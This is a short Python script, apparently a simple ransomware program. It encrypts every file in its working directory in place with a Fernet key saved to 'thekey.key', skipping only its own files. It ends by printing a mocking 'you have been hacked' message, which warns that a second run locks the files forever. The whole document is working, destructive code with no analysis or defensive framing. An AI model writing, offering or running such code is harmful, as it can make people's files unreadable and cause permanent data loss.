import os
from cryptography.fernet import Fernet

files = []

for file in os.listdir():
    if file == "SafeProgram.py" or file == "thekey.key" or file == "Decrypt.py" or file == "FastProgram.py" or file == "FastDecrypt.py":
        continue
    if os.path.isfile(file):
        files.append(file)

print(files)

key = Fernet.generate_key()

with open("thekey.key", 'wb') as thekey:
    thekey.write(key)

for file in files:
    with open(file, "rb") as thefile:
        contents = thefile.read()
    contents_encrypted = Fernet(key).encrypt(contents)
    with open(file, "wb") as thefile:
        thefile.write(contents_encrypted)


print("OOF your files have been encrypted D: what are you gonna do now? dont worry i have also send a decrypt file OR you have been hacked by someone who doesnt like you D: if that is the case you are actually rekt oh btw DONT RUN THE PROGRAM 2 TIMES itll lock them forever")